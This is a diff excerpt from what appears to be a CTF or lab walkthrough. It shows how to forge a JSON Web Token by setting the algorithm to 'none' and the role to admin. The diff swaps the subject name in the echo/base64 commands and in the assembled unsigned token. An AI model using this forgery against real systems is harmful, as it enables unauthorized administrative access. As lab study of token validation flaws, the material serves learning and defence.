@@ -394,14 +394,14 @@ Now i simply get the output, modify the user to be admin and the algorithm to `n
 echo '{"alg":"none","typ":"JWT"}' | base64               
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K
 
-echo '{"sub":"langflow-bot","role":"admin"}' | base64
-eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQo=
+echo '{"sub":"ethan","role":"admin"}' | base64         
+eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg==
 ```
 
 Now i have taken the output from the decode modified it and re-encoded it, now all i need to do is put it together
 
 ```python
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQo.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0K.eyJzdWIiOiJldGhhbiIsInJvbGUiOiJhZG1pbiJ9Cg.
 ```
 
 Ill strip the `=` away from the second part since its not needed, the i can leave the last part out since i am using the `none` algorithm so it does not need a signature
